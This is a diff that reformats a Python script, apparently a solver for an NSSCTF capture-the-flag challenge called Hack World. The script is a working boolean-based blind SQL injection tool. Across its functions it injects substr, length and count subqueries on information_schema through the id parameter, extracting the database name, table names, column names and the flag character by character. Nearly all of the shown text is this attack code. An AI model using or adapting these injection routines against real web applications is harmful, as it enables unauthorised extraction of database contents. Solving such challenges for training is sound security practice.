@@ -1,5 +1,4 @@
 #!/usr/bin/env python
-# -*- coding: utf-8 -*-
 # @Time    : 2026/8/28 17:41
 # @Author  : tushanfirm
 # @File    : Hack World.py
@@ -8,11 +7,11 @@
 import requests
 
 # 设定环境URL，由于每次开启环境得到的URL都不同，需要修改！
-url = 'http://node4.anna.nssctf.cn:27252/index.php'
+url = "http://node4.anna.nssctf.cn:27252/index.php"
 # 作为盲注成功的标记，成功页面会显示query_success
 success_mark = "query_success"
 # 把字母表转化成ascii码的列表，方便便利，需要时再把ascii码通过chr(int)转化成字母
-ascii_range = range(ord('a'), 1 + ord('z'))
+ascii_range = range(ord("a"), 1 + ord("z"))
 # flag的字符范围列表，包括花括号、a-z，数字0-9
 str_range = [123, 125] + list(ascii_range) + list(range(48, 58))
 
@@ -44,7 +43,9 @@ def getDatabase(length_of_database):
         # 切片，对每一个字符位遍历字母表
         # i+1是库名的第i+1个字符下标，j是字符取值a-z
         for j in ascii_range:
-            new_url = url + "?id=1 and substr(database(),{},1)='{}'".format(i + 1, chr(j))
+            new_url = url + "?id=1 and substr(database(),{},1)='{}'".format(
+                i + 1, chr(j)
+            )
             r = requests.get(new_url)
             if success_mark in r.text:
                 # 匹配到就加到库名变量里
@@ -61,8 +62,12 @@ def getCountofTables(database):
     i = 1
     # i从1开始，无限循环
     while True:
-        new_url = url + "?id=1 and (select count(*) from information_schema.tables where table_schema='{}')={}".format(
-            database, i)
+        new_url = (
+            url
+            + "?id=1 and (select count(*) from information_schema.tables where table_schema='{}')={}".format(
+                database, i
+            )
+        )
         r = requests.get(new_url)
         if success_mark in r.text:
             # 返回最终表数量
@@ -82,8 +87,12 @@ def getLengthListofTables(database, count_of_tables):
         j = 1
         while True:
             # i+1是第i+1张表
-            new_url = url + "?id=1 and length((select table_name from information_schema.tables where table_schema='{}' limit {},1))={}".format(
-                database, i, j)
+            new_url = (
+                url
+                + "?id=1 and length((select table_name from information_schema.tables where table_schema='{}' limit {},1))={}".format(
+                    database, i, j
+                )
+            )
             r = requests.get(new_url)
             if success_mark in r.text:
                 # 匹配到就加到表名长度的列表
@@ -108,8 +117,12 @@ def getTables(database, count_of_tables, length_list):
         for j in range(length_list[i]):
             # k是字符取值a-z
             for k in ascii_range:
-                new_url = url + "?id=1 and substr((select table_name from information_schema.tables where table_schema='{}' limit {},1),{},1)='{}'".format(
-                    database, i, j + 1, chr(k))
+                new_url = (
+                    url
+                    + "?id=1 and substr((select table_name from information_schema.tables where table_schema='{}' limit {},1),{},1)='{}'".format(
+                        database, i, j + 1, chr(k)
+                    )
+                )
                 r = requests.get(new_url)
                 if success_mark in r.text:
                     # 匹配到就加到表名变量里
@@ -127,8 +140,12 @@ def getCountofColumns(table):
     i = 1
     # i从1开始，无限循环
     while True:
-        new_url = url + "?id=1 and (select count(*) from information_schema.columns where table_name='{}')={}".format(
-            table, i)
+        new_url = (
+            url
+            + "?id=1 and (select count(*) from information_schema.columns where table_name='{}')={}".format(
+                table, i
+            )
+        )
         r = requests.get(new_url)
         if success_mark in r.text:
             # 返回最终列数量
@@ -147,8 +164,12 @@ def getLengthListofColumns(database, table, count_of_column):
         # j从1开始，无限循环列名长度
         j = 1
         while True:
-            new_url = url + "?id=1 and length((select column_name from information_schema.columns where table_schema='{}' and table_name='{}' limit {},1))={}".format(
-                database, table, i, j)
+            new_url = (
+                url
+                + "?id=1 and length((select column_name from information_schema.columns where table_schema='{}' and table_name='{}' limit {},1))={}".format(
+                    database, table, i, j
+                )
+            )
             r = requests.get(new_url)
             if success_mark in r.text:
                 # 匹配到就加到列名长度的列表
@@ -172,8 +193,12 @@ def getColumns(database, table, count_of_columns, length_list):
         # 列长度和列序号（i）一一对应
         for j in range(length_list[i]):
             for k in ascii_range:
-                new_url = url + "?id=1 and substr((select column_name from information_schema.columns where table_schema='{}' and table_name='{}' limit {},1),{},1)='{}'".format(
-                    database, table, i, j + 1, chr(k))
+                new_url = (
+                    url
+                    + "?id=1 and substr((select column_name from information_schema.columns where table_schema='{}' and table_name='{}' limit {},1),{},1)='{}'".format(
+                        database, table, i, j + 1, chr(k)
+                    )
+                )
                 r = requests.get(new_url)
                 if success_mark in r.text:
                     # 匹配到就加到列名变量里
@@ -193,8 +218,9 @@ def getData(database, table, column, str_list):
     while True:
         # flag中每一个字符的所有可能取值
         for i in str_list:
-            new_url = url + "?id=1 and substr((select {} from {}.{}),{},1)='{}'".format(column, database, table, j,
-                                                                                        chr(i))
+            new_url = url + "?id=1 and substr((select {} from {}.{}),{},1)='{}'".format(
+                column, database, table, j, chr(i)
+            )
             r = requests.get(new_url)
             # 如果返回的页面有query_success，即盲猜成功，跳过余下的for循环
             if success_mark in r.text:
@@ -210,7 +236,7 @@ def getData(database, table, column, str_list):
 
 
 # --主函数--
-if __name__ == '__main__':
+if __name__ == "__main__":
     # 爆flag的操作
     # 还有仿sqlmap的UI美化
     print("Judging the number of tables in the database...")
